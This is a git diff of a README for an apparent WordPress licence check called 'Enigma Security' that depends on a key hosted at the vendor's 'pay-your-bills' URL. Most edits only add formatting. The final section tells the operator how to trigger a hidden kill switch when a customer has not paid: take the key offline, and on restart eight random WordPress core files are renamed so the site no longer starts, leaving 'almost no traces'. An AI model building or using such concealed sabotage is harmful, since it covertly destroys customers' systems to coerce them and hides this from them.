@@ -1,43 +1,44 @@
 # impact-z.one: Enigma Security
 
-- enigma.uuids:
+- `enigma.uuids`:
 
     Map of active / configureable Enigma Customers
 
 	SCHEMA=<CUSTOMER_NAME>|<CUSTOMER_KEY>|<CUSTOMER_SECRET>|<CUSTOMER_SECRET_MD5>
 
-- enigma.secret:
+- `enigma.secret`:
 
     Secret String to Check the MD5 Sum against
 
     Copy onto Server Root to give over control to Customer (Ask yourself: Did he already pay all his bills?)
 
-- enigma.key:
+- `enigma.key`:
 
     Key with wich to encrypt the content from enigma.secret file
 
-    This Key will ultimately be needed to be reachable from impact-z.one domain e.g.: https://impact-z.one/pay-your-bills/thermologostic/enigma.key
-    Until this key is copied to the root folder of the WordPress installation, the above mentioned URL must return only the content of the used enigma.key file to create the .enc file
+    This Key will ultimately be needed to be reachable from impact-z.one domain e.g.:
+    		`https://impact-z.one/pay-your-bills/thermologostic/enigma.key`
+    Until this key is copied to the root folder of the WordPress installation, the above mentioned URL must return only the content of the used `enigma.key` file to create the .enc file
 
-- <CUSTOMER_ABBR>.enigma.enc:
+- `<CUSTOMER_ABBR>.enigma.enc`:
 
-    An customer prefixed enigma binary encoded file. This file needs to be on the customer server regardless of activation state. Copy to server root folder (this folder with wp-activate.php file)
+    An customer prefixed enigma binary encoded file. This file needs to be on the customer server regardless of activation state. Copy to server root folder (this folder with `wp-activate.php` file)
 
-     e.g: FILENAME='thermologistic.enigma.enc'
+     e.g: FILENAME=`thermologistic.enigma.enc`
 
-- enigma.dest:
+- `enigma.dest`:
 
-    name of the file where to temporarily flush decrypted enigma check value - this file will immediatly be deleted after creation of its MD5 Checksum. It contains the exact value of the contents from enigma.secret when used with correct enigma.key contents value (the enigma.key used to create the <CUSTOMER_ABBR>.enigma.enc file)
+    name of the file where to temporarily flush decrypted enigma check value - this file will immediatly be deleted after creation of its MD5 Checksum. It contains the exact value of the contents from enigma.secret when used with correct `enigma.key` contents value (the `enigma.key` used to create the `<CUSTOMER_ABBR>.enigma.enc` file)
 
-    e.g: CONTENT='thermologistic.enigma.dec'
+    e.g: CONTENT=`thermologistic.enigma.dec`
 
-- enigma.src:
+- `enigma.src`:
 
-    name of the file where the encrypted license-like <CUSTOMER_ABBR>.enigma.enc lies - also should be the exact value of the filename created by ENIGMA.
+    name of the file where the encrypted license-like `<CUSTOMER_ABBR>.enigma.enc` lies - also should be the exact value of the filename created by ENIGMA.
 
-    e.g: CONTENT='thermologistic.enigma.enc'
+    e.g: CONTENT=`thermologistic.enigma.enc`
 
-- enigma.enforce:
+- `enigma.enforce`:
 
     The MD5Checksum you absolutely have to reencrypt without knowing the way it was encrypted in first place. Only when everything was set absolutely correct, the same Checksum will be calculated by the decrypt method.
 
@@ -56,7 +57,7 @@ a v4 UUID created from https://www.uuidgenerator.net/version4
 ### 3. Third column is the content of your file `enigma.secret` - no NEWLINES allowed! in this case
         Thermologistic GmbH:OK
 
-This Value has to be decrypted when using the correct enigma.key value on the corresponding `<CUSTOMER_ABBR>.enigma.enc` binary file.
+This Value has to be decrypted when using the correct `enigma.key` value on the corresponding `<CUSTOMER_ABBR>.enigma.enc` binary file.
 
 It's something like a LICENSE key.
 
@@ -99,7 +100,10 @@ Into the folder onto the server where the file `wp-load.php` resides.
 
 # When Completely Paid:
 
-Copy the files `src/enigma.key` and `src/enigma.secret` into the same directory on the server
+Copy the files
+- `src/enigma.key`
+- `src/enigma.secret`
+into the same directory on the server
 
 When Problems With Payment: Take the file `https://impact-z.one/pay-your-bills/<CUSTOMER_ABBR>/enigma.key` offline or change it' content - The next time WordPress gets restarted random core php files are renamed (8 by the number), even without one of those WordPress cannot be started anymore, there are almost no traces to find
 
